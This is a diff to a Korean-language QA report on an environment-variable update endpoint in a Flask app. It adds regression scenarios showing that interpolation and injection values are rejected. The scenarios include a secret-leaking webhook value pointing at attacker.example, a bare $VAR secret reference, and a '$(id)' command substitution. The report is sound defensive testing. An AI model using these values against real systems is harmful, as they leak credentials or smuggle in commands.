@@ -4,10 +4,10 @@
   그리고 그것을 부르는 `POST /api/system/env` (`app/routes/common_update_routes.py:219-252`)
 - 구성 근거: `oh-my-claudecode:security-reviewer`(`infra044-security`)가 찾은 값 개행 주입
   결함 [F1] 과 이번 사이클의 변경 두 파일
-- 구성 2026-09-08 00:05 | 실행 2026-09-08 00:08
+- 구성 2026-09-08 00:05 | 실행 2026-09-08 00:08 | 2차 구성·실행 2026-09-08 00:52
 - QA 엔진(engine): 안전한 파이썬 하네스 + Flask 테스트 클라이언트
 - 단계(phase): 시나리오 구성 완료 | 실행 완료
-- 반복(iteration): 1회
+- 반복(iteration): 2회 (늦게 온 보안 리뷰의 [F4] 로 시나리오 넷 추가)
 - baseline 상태: 기준값 수집 완료 (결함 재현으로 확인)
 - 필수 여부(required): 예
 - 결과: 통과
@@ -141,6 +141,51 @@ HTTP 계층은 `.env` 를 건드리지 않는 거부 경로(S-11)만 실제로 �
 - 증거: `scratchpad/qa_infra044_s11.py` 실행 출력
 - 정리(cleanup): 실제 `.env` 를 건드리지 않는 거부 경로만 친다
 
+### S-12. `${VAR}` 로 가려 둔 비밀을 끌어다 쓸 수 없다 (회귀)
+- 조작: `.env` 에 `ADMIN_API_TOKEN` 을 두고
+  `{"DISCORD_WEBHOOK_URL": "https://attacker.example/${ADMIN_API_TOKEN}"}` 을 준다.
+- 기대: 그 줄이 `.env` 에 쓰이지 않는다. 쓰이면 python-dotenv 가 보간해 발송 대상 주소에
+  토큰이 실리고, `engine/messenger_config.py:38` 이 그 값을 읽어 서버가 스스로 보낸다.
+- 필수 여부(required): 예
+- 실제: `attacker.example` 이 파일에 없었다. 보간 후 다른 키에 비밀이 실린 것도 없었다.
+- 결과: 통과
+- 증거: `scratchpad/qa_infra044_s12.py` 실행 출력
+- 정리(cleanup): 임시 디렉터리
+
+### S-13. 중괄호 없는 `$VAR` 도 막힌다 (회귀)
+- 조작: `{"AI_PROVIDER": "$INTERNAL_IDENTITY_SECRET"}` 을 준다.
+- 기대: `AI_PROVIDER` 줄이 생기지 않는다. `@next/env` 는 중괄호 없는 `$VAR` 도 치환한다
+  (실측: `B=leak-$ADMIN_API_TOKEN` → `leak-SEKRIT-VALUE`). `AI_PROVIDER` 는 `.env` 에 없어
+  저장하면 파일 끝에 붙으므로 마지막 두 줄인 인가 비밀보다 뒤에 온다.
+- 필수 여부(required): 예
+- 실제: `AI_PROVIDER` 줄이 생기지 않았다.
+- 결과: 통과
+- 증거: `scratchpad/qa_infra044_s12.py` 실행 출력
+- 정리(cleanup): 임시 디렉터리
+
+### S-14. 명령 치환 `$( )` 도 함께 막힌다 (인접)
+- 조작: `{"SMTP_USER": "u@x.test$(id)"}` 를 준다.
+- 기대: `SMTP_USER` 줄이 생기지 않는다. 근본 해법은 `[INFRA-049]` 의 `source` 제거이지만
+  같은 정규식에 한 글자를 더해 함께 막는다.
+- 필수 여부(required): 예
+- 실제: `SMTP_USER` 줄이 생기지 않았다.
+- 결과: 통과
+- 증거: `scratchpad/qa_infra044_s12.py` 실행 출력
+- 정리(cleanup): 임시 디렉터리
+
+### S-15. `$` 가 보간을 일으키지 않는 값은 그대로 저장된다 (인접)
+- 조작: 같은 요청에 `{"SMTP_HOST": "smtp.gmail.com"}` 을 함께 넣고, 단위 검사에서
+  `pass!word$` 와 `has$!bang` 을 준다.
+- 기대: 셋 다 `.env` 에 그대로 들어간다. `$` 로 끝나거나 기호가 이어지면 어느 파서도
+  보간하지 않으므로 막을 이유가 없다. 정규식이 `$` 전체를 막지 않는 근거다.
+- 필수 여부(required): 예
+- 실제: `SMTP_HOST=smtp.gmail.com` 이 들어갔고 `environ` 에도 반영되었다. 단위 검사에서
+  `TELEGRAM_BOT_TOKEN=pass!word$` 와 `TELEGRAM_CHAT_ID=has$!bang` 도 그대로 저장되었다.
+- 결과: 통과
+- 증거: `scratchpad/qa_infra044_s12.py` 와 pytest
+  `test_update_env_file_rejects_interpolation_in_value`
+- 정리(cleanup): 임시 디렉터리
+
 ## 이월한 발견
 
 보안 리뷰가 이번 변경의 범위 밖에서 찾은 것 둘을 백로그로 올렸다.
@@ -157,7 +202,7 @@ HTTP 계층은 `.env` 를 건드리지 않는 거부 경로(S-11)만 실제로 �
 
 ## 실행 결과
 
-- 필수 시나리오: 통과 11 / 전체 11
+- 필수 시나리오: 통과 15 / 전체 15
 - 미통과 필수: 없음
 - 재개 판정: 완료 가능
 - 시나리오 밖에서 새로 발견: 코드 리뷰가 같은 파일에서 더 넓은 결함을 찾았다. `.env` 를
